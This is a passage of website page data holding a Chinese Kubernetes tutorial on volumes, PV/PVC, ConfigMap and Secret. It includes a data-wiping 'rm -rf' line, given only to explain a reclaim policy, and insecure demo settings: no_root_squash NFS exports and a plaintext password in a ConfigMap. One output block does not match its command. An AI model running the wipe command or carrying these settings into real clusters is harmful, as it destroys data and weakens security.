https://tomcat.itheima.com:31335来查看了\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n',charsets:{cjk:!0}},{title:"kubernetes(十一) 数据存储（挂载卷管理）",frontmatter:{title:"kubernetes(十一) 数据存储（挂载卷管理）",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/610",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E8%BF%90%E7%BB%B4/60.Kubernetes/610.kubernetes(%E5%8D%81%E4%B8%80)%20%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%EF%BC%88%E6%8C%82%E8%BD%BD%E5%8D%B7%E7%AE%A1%E7%90%86%EF%BC%89.html",relativePath:"01.运维/60.Kubernetes/610.kubernetes(十一) 数据存储（挂载卷管理）.md",key:"v-4fcd330d",path:"/kubernetes/610/",headers:[{level:2,title:"基本存储",slug:"基本存储",normalizedTitle:"基本存储",charIndex:419},{level:3,title:"EmptyDir",slug:"emptydir",normalizedTitle:"emptydir",charIndex:353},{level:3,title:"HostPath",slug:"hostpath",normalizedTitle:"hostpath",charIndex:362},{level:3,title:"NFS",slug:"nfs",normalizedTitle:"nfs",charIndex:371},{level:2,title:"高级存储",slug:"高级存储",normalizedTitle:"高级存储",charIndex:378},{level:3,title:"PV",slug:"pv",normalizedTitle:"pv",charIndex:383},{level:3,title:"PVC",slug:"pvc",normalizedTitle:"pvc",charIndex:386},{level:3,title:"生命周期",slug:"生命周期",normalizedTitle:"生命周期",charIndex:11},{level:2,title:"配置存储",slug:"配置存储",normalizedTitle:"配置存储",charIndex:393},{level:3,title:"ConfigMap",slug:"configmap",normalizedTitle:"configmap",charIndex:398},{level:3,title:"Secret",slug:"secret",normalizedTitle:"secret",charIndex:408}],lastUpdated:"12/22/2023, 11:52:48 AM",lastUpdatedTimestamp:1703217168e3,headersStr:"基本存储 EmptyDir HostPath NFS 高级存储 PV PVC 生命周期 配置存储 ConfigMap Secret",content:'在前面已经提到，容器的生命周期可能很短，会被频繁地创建和销毁。那么容器在销毁时，保存在容器中的数据也会被清除。这种结果对用户来说，在某些情况下是不乐意看到的。为了持久化保存容器的数据，kubernetes 引入了 Volume 的概念。\n\nVolume 是 Pod 中能够被多个容器访问的共享目录，它被定义在 Pod 上，然后被一个 Pod 里的多个容器挂载到具体的文件目录下，kubernetes 通过 Volume 实现同一个 Pod 中不同容器之间的数据共享以及数据的持久化存储。Volume 的生命容器不与 Pod 中单个容器的生命周期相关，当容器终止或者重启时，Volume 中的数据也不会丢失。\n\nkubernetes 的 Volume 支持多种类型，比较常见的有下面几个：\n\n * 简单存储：EmptyDir、HostPath、NFS\n * 高级存储：PV、PVC\n * 配置存储：ConfigMap、Secret\n\n\n# 基本存储\n\n\n# EmptyDir\n\nEmptyDir 是最基础的 Volume 类型，一个 EmptyDir 就是 Host 上的一个空目录。\n\nEmptyDir 是在 Pod 被分配到 Node 时创建的，它的初始内容为空，并且无须指定宿主机上对应的目录文件，因为 kubernetes 会自动分配一个目录，当 Pod 销毁时， EmptyDir 中的数据也会被永久删除。 EmptyDir 用途如下：\n\n * 临时空间，例如用于某些应用程序运行时所需的临时目录，且无须永久保留\n * 一个容器需要从另一个容器中获取数据的目录（多容器共享目录）\n\n接下来，通过一个容器之间文件共享的案例来使用一下 EmptyDir。\n\n在一个 Pod 中准备两个容器 nginx 和 busybox，然后声明一个 Volume 分别挂在到两个容器的目录中，然后 nginx 容器负责向 Volume 中写日志，busybox 中通过命令将日志内容读到控制台。\n\n\n\n创建一个 volume-emptydir.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: volume-emptydir\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerPort: 80\n    volumeMounts:  # 将logs-volume挂在到nginx容器中，对应的目录为 /var/log/nginx\n    - name: logs-volume\n      mountPath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] # 初始命令，动态读取指定文件中内容\n    volumeMounts:  # 将logs-volume 挂在到busybox容器中，对应的目录为 /logs\n    - name: logs-volume\n      mountPath: /logs\n  volumes: # 声明volume， name为logs-volume，类型为emptyDir\n  - name: logs-volume\n    emptyDir: {}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f volume-emptydir.yaml\npod/volume-emptydir created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods volume-emptydir -n dev -o wide\nNAME                  READY   STATUS    RESTARTS   AGE      IP       NODE   ...... \nvolume-emptydir       2/2     Running   0          97s   10.42.2.9   node1  ......\n\n# 通过podIp访问nginx\n[root@k8s-master01 ~]# curl 10.42.2.9\n......\n\n# 通过kubectl logs命令查看指定容器的标准输出\n[root@k8s-master01 ~]# kubectl logs -f volume-emptydir -n dev -c busybox\n10.42.1.0 - - [27/Jun/2021:15:08:54 +0000] "GET / HTTP/1.1" 200 612 "-" "curl/7.29.0" "-"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# HostPath\n\nEmptyDir 中数据不会被持久化，它会随着 Pod 的结束而销毁，如果想简单的将数据持久化到主机中，可以选择 HostPath。\n\nHostPath 就是将 Node 主机中一个实际目录挂在到 Pod 中，以供容器使用，这样的设计就可以保证 Pod 销毁了，但是数据依据可以存在于 Node 主机上。\n\n\n\n创建一个 volume-hostpath.yaml：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: volume-hostpath\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: logs-volume\n      mountPath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"]\n    volumeMounts:\n    - name: logs-volume\n      mountPath: /logs\n  volumes:\n  - name: logs-volume\n    hostPath: \n      path: /root/logs #宿主机目录\n      type: DirectoryOrCreate  # 目录存在就使用，不存在就先创建后使用\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n> 关于 type 的值的一点说明：\n> DirectoryOrCreate 目录存在就使用，不存在就先创建后使用\n> Directory 目录必须存在\n> FileOrCreate 文件存在就使用，不存在就先创建后使用\n> File 文件必须存在\n> Socket unix 套接字必须存在\n> CharDevice 字符设备必须存在\n> BlockDevice 块设备必须存在\n\n# 创建Pod\n[root@k8s-master01 ~]# kubectl create -f volume-hostpath.yaml\npod/volume-hostpath created\n\n# 查看Pod\n[root@k8s-master01 ~]# kubectl get pods volume-hostpath -n dev -o wide\nNAME                  READY   STATUS    RESTARTS   AGE   IP             NODE   ......\npod-volume-hostpath   2/2     Running   0          16s   10.42.2.10     node1  ......\n\n#访问nginx\n[root@k8s-master01 ~]# curl 10.42.2.10\n\n# 接下来就可以去host的/root/logs目录下查看存储的文件了\n###  注意: 下面的操作需要到Pod所在的节点运行（案例中是node1）\n[root@node1 ~]# ls /root/logs/\naccess.log  error.log\n\n# 同样的道理，如果在此目录下创建一个文件，到容器中也是可以看到的\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n> 注意：Pod 被 k8s 部署在哪个 Node，文件就在那个 Node 上挂载\n\n\n# NFS\n\nHostPath 可以解决数据持久化的问题，但是一旦 Node 节点故障了，Pod 如果转移到了别的节点，又会出现问题了，此时需要准备单独的网络存储系统，比较常用的用 NFS、CIFS。\n\nNFS 是一个网络文件存储系统，可以搭建一台 NFS 服务器，然后将 Pod 中的存储直接连接到 NFS 系统上，这样的话，无论 Pod 在节点上怎么转移，只要 Node 跟 NFS 的对接没问题，数据就可以成功访问。\n\n\n\n1）首先要准备 nfs 的服务器，这里为了简单，直接是 master 节点做 nfs 服务器\n\n# 在nfs上安装nfs服务\n[root@nfs ~]# yum install nfs-utils -y\n\n# 准备一个共享目录\n[root@nfs ~]# mkdir /root/data/nfs -pv\n\n# 将共享目录以读写权限暴露给192.168.5.0/24网段中的所有主机\n[root@nfs ~]# vim /etc/exports\n[root@nfs ~]# more /etc/exports\n/root/data/nfs     192.168.5.0/24(rw,no_root_squash)\n\n# 启动nfs服务\n[root@nfs ~]# systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n2）接下来，要在的每个 node 节点上都安装下 nfs，这样的目的是为了 node 节点可以驱动 nfs 设备\n\n# 在node上安装nfs服务，注意不需要启动\n[root@k8s-master01 ~]# yum install nfs-utils -y\n\n\n1\n2\n\n\n3）接下来，就可以编写 pod 的配置文件了，创建 volume-nfs.yaml\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: volume-nfs\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerPort: 80\n    volumeMounts:\n    - name: logs-volume\n      mountPath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] \n    volumeMounts:\n    - name: logs-volume\n      mountPath: /logs\n  volumes:\n  - name: logs-volume\n    nfs:\n      server: 192.168.5.6  #nfs服务器地址\n      path: /root/data/nfs #共享文件路径\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n4）最后，运行下 pod，观察结果\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f volume-nfs.yaml\npod/volume-nfs created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods volume-nfs -n dev\nNAME                  READY   STATUS    RESTARTS   AGE\nvolume-nfs        2/2     Running   0          2m9s\n\n# 查看nfs服务器上的共享目录，发现已经有文件了\n[root@k8s-master01 ~]# ls /root/data/\naccess.log  error.log\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 高级存储\n\n前面已经学习了使用 NFS 提供存储，此时就要求用户会搭建 NFS 系统，并且会在 yaml 配置 nfs。由于 kubernetes 支持的存储系统有很多，要求客户全都掌握，显然不现实。为了能够屏蔽底层存储实现的细节，方便用户使用， kubernetes 引入 PV 和 PVC 两种资源对象。\n\nPV（Persistent Volume）是持久化卷的意思，是对底层的共享存储的一种抽象。一般情况下 PV 由 kubernetes 管理员进行创建和配置，它与底层具体的共享存储技术有关，并通过插件完成与共享存储的对接。\n\nPVC（Persistent Volume Claim）是持久卷声明的意思，是用户对于存储需求的一种声明。换句话说，PVC 其实就是用户向 kubernetes 系统发出的一种资源需求申请。\n\n\n\n使用了 PV 和 PVC 之后，工作可以得到进一步的细分：\n\n * 存储：存储工程师维护\n * PV： kubernetes 管理员维护\n * PVC：kubernetes 用户维护\n\n\n# PV\n\nPV 是存储资源的抽象，下面是资源清单文件:\n\napiVersion: v1  \nkind: PersistentVolume\nmetadata:\n  name: pv2\nspec:\n  nfs: # 存储类型，与底层真正存储对应\n  capacity:  # 存储能力，目前只支持存储空间的设置\n    storage: 2Gi\n  accessModes:  # 访问模式\n  storageClassName: # 存储类别\n  persistentVolumeReclaimPolicy: # 回收策略\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nPV 的关键配置参数说明：\n\n * 存储类型\n   底层实际存储的类型，kubernetes 支持多种存储类型，每种存储类型的配置都有所差异\n * 存储能力（capacity）\n   目前只支持存储空间的设置 (storage=1Gi)，不过未来可能会加入 IOPS、吞吐量等指标的配置\n * 访问模式（accessModes）\n   用于描述用户应用对存储资源的访问权限，访问权限包括下面几种方式：\n   * ReadWriteOnce（RWO）：读写权限，但是只能被单个节点挂载 (指的是 PV 与 PVC 绑定只能一个)\n   * ReadOnlyMany（ROX）： 只读权限，可以被多个节点挂载\n   * ReadWriteMany（RWX）：读写权限，可以被多个节点挂载\n     需要注意的是，底层不同的存储类型可能支持的访问模式不同\n * 回收策略（persistentVolumeReclaimPolicy）\n   当 PV 不再被使用了之后，对其的处理方式。目前支持三种策略：\n   * Retain （保留） 保留数据，需要管理员手工清理数据\n   * Recycle（回收） 清除 PV 中的数据，效果相当于执行 rm -rf /thevolume/*\n   * Delete （删除） 与 PV 相连的后端存储完成 volume 的删除操作，当然这常见于云服务商的存储服务\n     需要注意的是，底层不同的存储类型可能支持的回收策略不同\n * 存储类别\n   PV 可以通过 storageClassName 参数指定一个存储类别\n   * 具有特定类别的 PV 只能与请求了该类别的 PVC 进行绑定\n   * 未设定类别的 PV 则只能与不请求任何类别的 PVC 进行绑定\n * 状态（status）\n   一个 PV 的生命周期中，可能会处于 4 中不同的阶段：\n   * Available（可用）： 表示可用状态，还未被任何 PVC 绑定\n   * Bound（已绑定）： 表示 PV 已经被 PVC 绑定\n   * Released（已释放）： 表示 PVC 被删除，但是资源还未被集群重新声明\n   * Failed（失败）： 表示该 PV 的自动回收失败\n\n实验\n使用 NFS 作为存储，来演示 PV 的使用，创建 3 个 PV，对应 NFS 中的 3 个暴露的路径。\n1. 准备 NFS 环境\n\n# 创建目录\n[root@nfs ~]# mkdir /root/data/{pv1,pv2,pv3} -pv\n\n# 暴露服务\n[root@nfs ~]# more /etc/exports\n/root/data/pv1     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv2     192.168.5.0/24(rw,no_root_squash)\n/root/data/pv3     192.168.5.0/24(rw,no_root_squash)\n\n# 重启服务\n[root@nfs ~]#  systemctl restart nfs\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n2. 创建 pv.yaml\n\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name:  pv1\nspec:\n  capacity: \n    storage: 1Gi\n  accessModes:\n  - ReadWriteMany\n  persistentVolumeReclaimPolicy: Retain\n  nfs:\n    path: /root/data/pv1\n    server: 192.168.5.6\n\n---\n\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name:  pv2\nspec:\n  capacity: \n    storage: 2Gi\n  accessModes:\n  - ReadWriteMany\n  persistentVolumeReclaimPolicy: Retain\n  nfs:\n    path: /root/data/pv2\n    server: 192.168.5.6\n    \n---\n\napiVersion: v1\nkind: PersistentVolume\nmetadata:\n  name:  pv3\nspec:\n  capacity: \n    storage: 3Gi\n  accessModes:\n  - ReadWriteMany\n  persistentVolumeReclaimPolicy: Retain\n  nfs:\n    path: /root/data/pv3\n    server: 192.168.5.6\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n# 创建 pv\n[root@k8s-master01 ~]# kubectl create -f pv.yaml\npersistentvolume/pv1 created\npersistentvolume/pv2 created\npersistentvolume/pv3 created\n\n# 查看pv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nNAME   CAPACITY   ACCESS MODES  RECLAIM POLICY  STATUS      AGE   VOLUMEMODE\npv1    1Gi        RWX            Retain        Available    10s   Filesystem\npv2    2Gi        RWX            Retain        Available    10s   Filesystem\npv3    3Gi        RWX            Retain        Available    9s    Filesystem\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# PVC\n\nPVC 是资源的申请，用来声明对存储空间、访问模式、存储类别需求信息。下面是资源清单文件:\n\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc\n  namespace: dev\nspec:\n  accessModes: # 访问模式\n  selector: # 采用标签对PV选择\n  storageClassName: # 存储类别\n  resources: # 请求空间\n    requests:\n      storage: 5Gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nPVC 的关键配置参数说明：\n\n * 访问模式（accessModes）\n   用于描述用户应用对存储资源的访问权限\n * 选择条件（selector）\n   通过 Label Selector 的设置，可使 PVC 对于系统中己存在的 PV 进行筛选\n * 存储类别（storageClassName）\n   PVC 在定义时可以设定需要的后端存储的类别，只有设置了该 class 的 pv 才能被系统选出\n * 资源请求（Resources ）\n   描述对存储资源的请求\n\n实验\n1. 创建 pvc.yaml，申请 pv\n\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc1\n  namespace: dev\nspec:\n  accessModes: \n  - ReadWriteMany\n  resources:\n    requests:\n      storage: 1Gi\n---\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc2\n  namespace: dev\nspec:\n  accessModes: \n  - ReadWriteMany\n  resources:\n    requests:\n      storage: 1Gi\n---\napiVersion: v1\nkind: PersistentVolumeClaim\nmetadata:\n  name: pvc3\n  namespace: dev\nspec:\n  accessModes: \n  - ReadWriteMany\n  resources:\n    requests:\n      storage: 1Gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n# 创建pvc\n[root@k8s-master01 ~]# kubectl create -f pvc.yaml\npersistentvolumeclaim/pvc1 created\npersistentvolumeclaim/pvc2 created\npersistentvolumeclaim/pvc3 created\n\n# 查看pvc\n[root@k8s-master01 ~]# kubectl get pvc  -n dev -o wide\nNAME   STATUS   VOLUME   CAPACITY   ACCESS MODES   STORAGECLASS   AGE   VOLUMEMODE\npvc1   Bound    pv1      1Gi        RWX                           15s   Filesystem\npvc2   Bound    pv2      2Gi        RWX                           15s   Filesystem\npvc3   Bound    pv3      3Gi        RWX                           15s   Filesystem\n\n# 查看pv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nNAME  CAPACITY ACCESS MODES  RECLAIM POLICY  STATUS    CLAIM       AGE     VOLUMEMODE\npv1    1Gi        RWx        Retain          Bound    dev/pvc1    3h37m    Filesystem\npv2    2Gi        RWX        Retain          Bound    dev/pvc2    3h37m    Filesystem\npv3    3Gi        RWX        Retain          Bound    dev/pvc3    3h37m    Filesystem   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n2. 创建 pods.yaml, 使用 pv\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod1\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod1 >> /root/out.txt; sleep 10; done;"]\n    volumeMounts:\n    - name: volume\n      mountPath: /root/\n  volumes:\n    - name: volume\n      persistentVolumeClaim:\n        claimName: pvc1\n        readOnly: false\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod2\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod2 >> /root/out.txt; sleep 10; done;"]\n    volumeMounts:\n    - name: volume\n      mountPath: /root/\n  volumes:\n    - name: volume\n      persistentVolumeClaim:\n        claimName: pvc2\n        readOnly: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pods.yaml\npod/pod1 created\npod/pod2 created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME   READY   STATUS    RESTARTS   AGE   IP            NODE   \npod1   1/1     Running   0          14s   10.244.1.69   node1   \npod2   1/1     Running   0          14s   10.244.1.70   node1  \n\n# 查看pvc\n[root@k8s-master01 ~]# kubectl get pvc -n dev -o wide\nNAME   STATUS   VOLUME   CAPACITY   ACCESS MODES      AGE   VOLUMEMODE\npvc1   Bound    pv1      1Gi        RWX               94m   Filesystem\npvc2   Bound    pv2      2Gi        RWX               94m   Filesystem\npvc3   Bound    pv3      3Gi        RWX               94m   Filesystem\n\n# 查看pv\n[root@k8s-master01 ~]# kubectl get pv -n dev -o wide\nNAME   CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS   CLAIM       AGE     VOLUMEMODE\npv1    1Gi        RWX            Retain           Bound    dev/pvc1    5h11m   Filesystem\npv2    2Gi        RWX            Retain           Bound    dev/pvc2    5h11m   Filesystem\npv3    3Gi        RWX            Retain           Bound    dev/pvc3    5h11m   Filesystem\n\n# 查看nfs中的文件存储\n[root@nfs ~]# more /root/data/pv1/out.txt\nnode1\nnode1\n[root@nfs ~]# more /root/data/pv2/out.txt\nnode2\nnode2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 生命周期\n\nPVC 和 PV 是一一对应的，PV 和 PVC 之间的相互作用遵循以下生命周期：\n\n * 资源供应：管理员手动创建底层存储和 PV\n * 资源绑定：用户创建 PVC，kubernetes 负责根据 PVC 的声明去寻找 PV，并绑定\n   在用户定义好 PVC 之后，系统将根据 PVC 对存储资源的请求在已存在的 PV 中选择一个满足条件的\n   * 一旦找到，就将该 PV 与用户定义的 PVC 进行绑定，用户的应用就可以使用这个 PVC 了\n   * 如果找不到，PVC 则会无限期处于 Pending 状态，直到等到系统管理员创建了一个符合其要求的 PV\n     PV一旦绑定到某个PVC上，就会被这个PVC独占，不能再与其他PVC进行绑定了\n * 资源使用：用户可在 pod 中像 volume 一样使用 pvc\n   Pod 使用 Volume 的定义，将 PVC 挂载到容器内的某个路径进行使用。\n * 资源释放：用户删除 pvc 来释放 pv\n   当存储资源使用完毕后，用户可以删除 PVC，与该 PVC 绑定的 PV 将会被标记为 “已释放”，但还不能立刻与其他 PVC 进行绑定。通过之前 PVC 写入的数据可能还被留在存储设备上，只有在清除之后该 PV 才能再次使用。\n * 资源回收：kubernetes 根据 pv 设置的回收策略进行资源的回收\n   对于 PV，管理员可以设定回收策略，用于设置与之绑定的 PVC 释放资源之后如何处理遗留数据的问题。只有 PV 的存储空间完成回收，才能供新的 PVC 绑定和使用\n\n\n\n\n# 配置存储\n\n\n# ConfigMap\n\nConfigMap 是一种比较特殊的存储卷，它的主要作用是用来存储配置信息的。\n\n创建 configmap.yaml，内容如下：\n\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: configmap\n  namespace: dev\ndata:\n  info: |\n    username:admin\n    password:123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n接下来，使用此配置文件创建 configmap\n\n# 创建configmap\n[root@k8s-master01 ~]# kubectl create -f configmap.yaml\nconfigmap/configmap created\n\n# 查看configmap详情\n[root@k8s-master01 ~]# kubectl describe cm configmap -n dev\nName:         configmap\nNamespace:    dev\nLabels:       <none>\nAnnotations:  <none>\n\nData\n====\ninfo:\n----\nusername:admin\npassword:123456\n\nEvents:  <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n接下来创建一个 pod-configmap.yaml，将上面创建的 configmap 挂载进去\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-configmap\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumeMounts: # 将configmap挂载到目录\n    - name: config\n      mountPath: /configmap/config\n  volumes: # 引用configmap\n  - name: config\n    configMap:\n      name: configmap\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-configmap.yaml\npod/pod-configmap created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pod pod-configmap -n dev\nNAME            READY   STATUS    RESTARTS   AGE\npod-configmap   1/1     Running   0          6s\n\n#进入容器\n[root@k8s-master01 ~]# kubectl exec -it pod-configmap -n dev /bin/sh\n# cd /configmap/config/\n# ls\ninfo\n# more info\nusername:admin\npassword:123456\n\n# 可以看到映射已经成功，每个configmap都映射成了一个目录\n# key---\x3e文件     value----\x3e文件中的内容\n# 此时如果更新configmap的内容, 容器中的值也会动态更新\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# Secret\n\n在 kubernetes 中，还存在一种和 ConfigMap 非常类似的对象，称为 Secret 对象。它主要用于存储敏感信息，例如密码、秘钥、证书等等。\n\n1. 首先使用 base64 对数据进行编码\n\n[root@k8s-master01 ~]# echo -n \'admin\' | base64 #准备username\nYWRtaW4=\n[root@k8s-master01 ~]# echo -n \'123456\' | base64 #准备password\nMTIzNDU2\n\n\n1\n2\n3\n4\n\n\n2. 接下来编写 secret.yaml，并创建 Secret\n\napiVersion: v1\nkind: Secret\nmetadata:\n  name: secret\n  namespace: dev\ntype: Opaque\ndata:\n  username: YWRtaW4=\n  password: MTIzNDU2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 创建secret\n[root@k8s-master01 ~]# kubectl create -f secret.yaml\nsecret/secret created\n\n# 查看secret详情\n[root@k8s-master01 ~]# kubectl describe secret secret -n dev\nName:         secret\nNamespace:    dev\nLabels:       <none>\nAnnotations:  <none>\nType:  Opaque\nData\n====\npassword:  6 bytes\nusername:  5 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n3. 创建 pod-secret.yaml，将上面创建的 secret 挂载进去：\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-secret\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumeMounts: # 将secret挂载到目录\n    - name: config\n      mountPath: /secret/config\n  volumes:\n  - name: config\n    secret:\n      secretName: secret\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-secret.yaml\npod/pod-secret created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pod pod-secret -n dev\nNAME            READY   STATUS    RESTARTS   AGE\npod-secret      1/1     Running   0          2m28s\n\n# 进入容器，查看secret信息，发现已经自动解码了\n[root@k8s-master01 ~]# kubectl exec -it pod-secret /bin/sh -n dev\n/ # ls /secret/config/\npassword  username\n/ # more /secret/config/username\nadmin\n/ # more /secret/config/password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n至此，已经实现了利用 secret 实现了信息的编码。',normalizedContent:'在前面已经提到，容器的生命周期可能很短，会被频繁地创建和销毁。那么容器在销毁时，保存在容器中的数据也会被清除。这种结果对用户来说，在某些情况下是不乐意看到的。为了持久化保存容器的数据，kubernetes 引入了 volume 的概念。\n\nvolume 是 pod 中能够被多个容器访问的共享目录，它被定义在 pod 上，然后被一个 pod 里的多个容器挂载到具体的文件目录下，kubernetes 通过 volume 实现同一个 pod 中不同容器之间的数据共享以及数据的持久化存储。volume 的生命容器不与 pod 中单个容器的生命周期相关，当容器终止或者重启时，volume 中的数据也不会丢失。\n\nkubernetes 的 volume 支持多种类型，比较常见的有下面几个：\n\n * 简单存储：emptydir、hostpath、nfs\n * 高级存储：pv、pvc\n * 配置存储：configmap、secret\n\n\n# 基本存储\n\n\n# emptydir\n\nemptydir 是最基础的 volume 类型，一个 emptydir 就是 host 上的一个空目录。\n\nemptydir 是在 pod 被分配到 node 时创建的，它的初始内容为空，并且无须指定宿主机上对应的目录文件，因为 kubernetes 会自动分配一个目录，当 pod 销毁时， emptydir 中的数据也会被永久删除。 emptydir 用途如下：\n\n * 临时空间，例如用于某些应用程序运行时所需的临时目录，且无须永久保留\n * 一个容器需要从另一个容器中获取数据的目录（多容器共享目录）\n\n接下来，通过一个容器之间文件共享的案例来使用一下 emptydir。\n\n在一个 pod 中准备两个容器 nginx 和 busybox，然后声明一个 volume 分别挂在到两个容器的目录中，然后 nginx 容器负责向 volume 中写日志，busybox 中通过命令将日志内容读到控制台。\n\n\n\n创建一个 volume-emptydir.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: volume-emptydir\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    ports:\n    - containerport: 80\n    volumemounts:  # 将logs-volume挂在到nginx容器中，对应的目录为 /var/log/nginx\n    - name: logs-volume\n      mountpath: /var/log/nginx\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","tail -f /logs/access.log"] # 初始命令，动态读取指定文件中内容\n    volumemounts:  # 将logs-volume 挂在到busybox容器中，对应的目录为 /logs\n    - name: logs-volume\n      mountpath: /logs\n  volumes: # 声明volume， name为logs-volume，类型为emptydir\n  - name: logs-volume\n    emptydir: {}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f volume-emptydir.yaml\npod/volume-emptydir created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods volume-emptydir -n dev -o wide\nname                  ready   status    restarts   age      ip       node   ...... \nvolume-emptydir       2/2     running   0          97s   10.42.2.9   node1  ......\n\n# 通过podip访问nginx\n[root@k8s-master01 ~]# curl 10.42.2.9\n......\n\n# 通过kubectl logs命令查看指定容器的标准输出\n[root@k8s-master01 ~]# kubectl logs -f volume-emptydir -n dev -c 